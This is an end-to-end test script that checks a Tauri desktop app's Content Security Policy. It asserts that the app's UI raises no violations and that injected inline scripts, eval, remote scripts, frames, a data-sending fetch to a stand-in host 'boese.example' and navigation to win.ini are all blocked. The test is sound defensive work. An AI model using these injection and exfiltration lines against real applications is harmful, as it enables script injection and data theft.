/**
 * Content Security Policy – the real app under exactly the policy from src-tauri/tauri.conf.json.
 *
 *   node scripts/e2e/screens/csp.mjs           everything
 *   node scripts/e2e/screens/csp.mjs --show    window visible
 *
 * In the bundled app Tauri sets the policy itself; in the debug build (which the tests use) the UI
 * comes from the Vite server, which sends it here as a header (FORKYARD_E2E_CSP, see
 * vite.config.ts). Both are checked:
 *
 * 1. The UI works under it without a single violation – including the parts that set styles
 *    themselves (terminal with xterm.js, editor and diff with CodeMirror, Markdown preview).
 * 2. The policy takes effect: injected inline script, eval, foreign connections, foreign images
 *    and frames are blocked by the WebView.
 */
import { spawn } from "node:child_process";
import fs from "node:fs";
import net from "node:net";
import path from "node:path";
import { launchApp, ROOT } from "../driver.mjs";
import { makeRichRepo } from "../fixtures.mjs";
import { createChecks } from "./_wip.mjs";

process.env.GIT_OPTIONAL_LOCKS = "0";

const show = process.argv.includes("--show");
const checks = createChecks("csp");
const { check, equal, eventually, section, finish } = checks;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const configured = JSON.parse(fs.readFileSync(path.join(ROOT, "src-tauri", "tauri.conf.json"), "utf8")).app.security.csp;

function freePort() {
  return new Promise((resolve, reject) => {
    const server = net.createServer();
    server.unref();
    server.on("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
}

/** A Vite server just for this script: like the driver's test server, but with the header. */
async function startCspServer() {
  const port = await freePort();
  const logPath = path.join(ROOT, "target", "e2e", "csp-vite.log");
  fs.mkdirSync(path.dirname(logPath), { recursive: true });
  const log = fs.openSync(logPath, "w");
  const child = spawn(process.execPath, [path.join(ROOT, "node_modules", "vite", "bin", "vite.js"), "--port", String(port), "--strictPort"], {
    cwd: ROOT,
    env: { ...process.env, FORKYARD_E2E_PORT: String(port), FORKYARD_E2E_CSP: "1" },
    windowsHide: true,
    stdio: ["ignore", log, log],
  });
  fs.closeSync(log);
  const url = `http://127.0.0.1:${port}`;
  const deadline = Date.now() + 120_000;
  for (;;) {
    try {
      const response = await fetch(`${url}/__gc_root`, { signal: AbortSignal.timeout(1500) });
      if (response.ok) break;
    } catch {
      // still starting
    }
    if (Date.now() > deadline) {
      child.kill();
      throw new Error(`The Vite server with CSP does not respond. Log: ${logPath}`);
    }
    await sleep(200);
  }
  // Warm up: the first request triggers dependency bundling.
  await fetch(`${url}/src/main.tsx`, { signal: AbortSignal.timeout(120_000) }).then((response) => response.text()).catch(() => undefined);
  return { url, port, stop: () => child.kill() };
}

let app = null;
let server = null;
const onError = async (title) => {
  if (app) await app.screenshot(`target/e2e/csp-error-${title.replace(/[^A-Za-z0-9]+/g, "-").slice(0, 40)}.png`).catch(() => undefined);
};
const run = (title, body) => section(title, body, onError);
/** Violations the WebView reported since the last call. */
const violations = () => app.page.evaluate(() => (window.__gcCsp ?? []).splice(0));
const cspErrors = () => app.consoleErrors.filter((text) => /content security policy|refused to/i.test(text));

try {
  server = await startCspServer();

  await run("The test server sends the policy from tauri.conf.json", async () => {
    const response = await fetch(server.url);
    const header = response.headers.get("content-security-policy") ?? "";
    // The only difference from the bundled app: the Vite server as its own origin for connections.
    equal(header, configured.replace("connect-src ", `connect-src 'self' ws://127.0.0.1:${server.port} `), "Content-Security-Policy header");
    for (const part of ["default-src 'self'", "script-src 'self'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "frame-ancestors 'none'"]) {
      check(configured.includes(part), `the policy contains ${part}`);
    }
    check(!/script-src[^;]*unsafe/.test(configured), "script-src allows neither inline script nor eval");
  });

  app = await launchApp({ show, devUrl: server.url });
  const { page } = app;
  // Every violation is recorded – from the first byte of the page, so it is hooked in before the reload.
  await page.addInitScript(() => {
    window.__gcCsp = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      window.__gcCsp.push({ directive: event.effectiveDirective, blocked: event.blockedURI, sample: event.sample });
    });
  });
  await app.reload();
  await app.settle();

  const repo = makeRichRepo({ name: "wetterstation" });
  let ids = null;

  // -------------------------------------------------------------------------------------------
  await run("The UI works under the policy without violations", async () => {
    equal(await page.evaluate(() => window.location.origin), server.url, "the app loads from the server with the policy");
    ids = await app.openRepo(repo.path);
    await page.locator('[data-area="left"]').waitFor({ state: "visible", timeout: 15_000 });
    await app.settle();
    equal(await violations(), [], "start, tab bar, graph, left panel, commit panel");

    // Diff (CodeMirror sets its own styles)
    await page.evaluate(([tabId]) => window.__gc.store.getState().openDiff(tabId, "README.md", { kind: "unstaged" }), [ids.tabId]);
    await page.locator(".cm-editor, [data-screen='diff']").first().waitFor({ state: "visible", timeout: 15_000 });
    await app.settle();
    equal(await violations(), [], "diff view");

    // File view with Markdown preview (marked + DOMPurify) and editor
    await page.evaluate(([tabId]) => window.__gc.store.getState().openFile(tabId, "README.md", null, "view"), [ids.tabId]);
    await page.locator("[data-screen='file-view']").first().waitFor({ state: "visible", timeout: 15_000 });
    await app.settle();
    await page.evaluate(([tabId]) => window.__gc.store.getState().openFile(tabId, "README.md", null, "edit"), [ids.tabId]);
    await page.locator(".cm-editor").first().waitFor({ state: "visible", timeout: 15_000 });
    await app.settle();
    equal(await violations(), [], "file view, Markdown preview and editor");
    await page.evaluate(([tabId]) => window.__gc.store.getState().closeCenter(tabId), [ids.tabId]);

    // Terminal (xterm.js creates its own <style>)
    await page.evaluate(([tabId]) => window.__gc.store.getState().toggleTerminal(tabId), [ids.tabId]);
    const terminal = page.locator('[data-area="terminal"]');
    await terminal.waitFor({ state: "visible", timeout: 15_000 });
    await eventually(() => terminal.getAttribute("data-state"), "running", "the shell is running", 30_000);
    await eventually(async () => (await terminal.locator(".xterm-rows, .xterm-screen").count()) > 0, true, "xterm.js renders");
    const colored = await terminal.locator(".xterm").first().evaluate((element) => getComputedStyle(element).fontFamily.length > 0);
    check(colored, "the terminal got its styles");
    equal(await violations(), [], "Terminal");
    await page.evaluate(([tabId]) => window.__gc.store.getState().toggleTerminal(tabId), [ids.tabId]);

    // Preferences, activity log, keyboard shortcuts
    for (const overlay of [{ kind: "preferences", section: "general" }, { kind: "activity" }, { kind: "shortcuts" }]) {
      await page.evaluate((value) => window.__gc.store.getState().openOverlay(value), overlay);
      await app.settle();
      await page.waitForTimeout(200);
      await page.evaluate(() => window.__gc.store.getState().closeOverlay());
    }
    await app.settle();
    equal(await violations(), [], "preferences, activity log, keyboard shortcuts");
    equal(cspErrors(), [], "no WebView message about blocked content");
  });

  // -------------------------------------------------------------------------------------------
  await run("The policy takes effect: injected content is blocked", async () => {
    await violations();
    const result = await page.evaluate(async () => {
      const outcome = {};
      // 1. Inline script, as a flaw in rendering foreign content would inject it.
      const script = document.createElement("script");
      script.textContent = "window.__gcInjected = true;";
      document.body.append(script);
      outcome.inlineScriptRan = window.__gcInjected === true;
      // 2. Inline handler in injected HTML.
      const holder = document.createElement("div");
      holder.innerHTML = '<button type="button" onclick="window.__gcHandler = true">x</button>';
      document.body.append(holder);
      holder.querySelector("button").click();
      await new Promise((resolve) => setTimeout(resolve, 300));
      outcome.inlineHandlerRan = window.__gcHandler === true;
      // 3. eval and Function from text.
      try {
        outcome.evalRan = window.eval("1 + 1") === 2;
      } catch (error) {
        outcome.evalRan = false;
        outcome.evalError = error.name;
      }
      try {
        outcome.functionRan = new Function("return 1")() === 1;
      } catch {
        outcome.functionRan = false;
      }
      // 4. Connection to a foreign host (blocked before anything goes out).
      try {
        await fetch("https://boese.example/abfluss?daten=1");
        outcome.foreignFetch = "allowed";
      } catch {
        outcome.foreignFetch = "blocked";
      }
      // 5. Image and frame from a foreign host, script from a foreign host.
      const image = new Image();
      image.src = "https://boese.example/zaehlpixel.png";
      const frame = document.createElement("iframe");
      frame.src = "https://boese.example/";
      document.body.append(frame);
      const remote = document.createElement("script");
      remote.src = "https://boese.example/x.js";
      document.body.append(remote);
      await new Promise((resolve) => setTimeout(resolve, 500));
      holder.remove();
      frame.remove();
      remote.remove();
      script.remove();
      return outcome;
    });
    equal(result.inlineScriptRan, false, "injected inline script does not run");
    equal(result.inlineHandlerRan, false, "an inline handler (onclick=…) does not run");
    equal([result.evalRan, result.functionRan], [false, false], "eval and new Function are blocked");
    equal(result.foreignFetch, "blocked", "a connection to a foreign host is blocked");
    const seen = await violations();
    const directives = [...new Set(seen.map((entry) => entry.directive))].sort();
    for (const expected of ["connect-src", "frame-src", "img-src", "script-src-attr", "script-src-elem"]) {
      check(directives.includes(expected), `the WebView reports a violation of ${expected} (reported: ${directives.join(", ")})`);
    }
    check(seen.some((entry) => entry.directive === "script-src" || entry.directive === "script-src-elem"), "eval counts as a violation too");
    // The app itself keeps working afterwards.
    const status = await app.invoke("status_get", { repoId: ids.repoId });
    check(status && typeof status === "object", "the core keeps answering (ipc is allowed)");
  });

  // -------------------------------------------------------------------------------------------
  await run("The window does not leave its own UI", async () => {
    // The app's navigation rule (src-tauri, navigation_guard): navigating to a foreign address – as
    // an injected link or a redirect would trigger – is rejected; the page stays as it is.
    await page.evaluate(() => {
      window.__gcStays = "yes";
    });
    for (const target of ["https://boese.example/uebernahme", "http://127.0.0.1:9/fremd", "file:///C:/Windows/win.ini"]) {
      await page.evaluate((url) => {
        try {
          window.location.assign(url);
        } catch {
          // Some targets are already rejected by the WebView – fine too.
        }
      }, target).catch(() => undefined);
      await sleep(1200);
      const state = await page.evaluate(() => ({ origin: window.location.origin, stays: window.__gcStays ?? null })).catch((error) => ({ error: String(error?.message ?? error).split("\n")[0] }));
      equal(state, { origin: server.url, stays: "yes" }, `no navigation to ${target}`);
    }
    const status = await app.invoke("status_get", { repoId: ids.repoId });
    check(status && typeof status === "object", "the app keeps working afterwards");
  });
} finally {
  await app?.close().catch(() => undefined);
  server?.stop();
}
process.exit(finish());
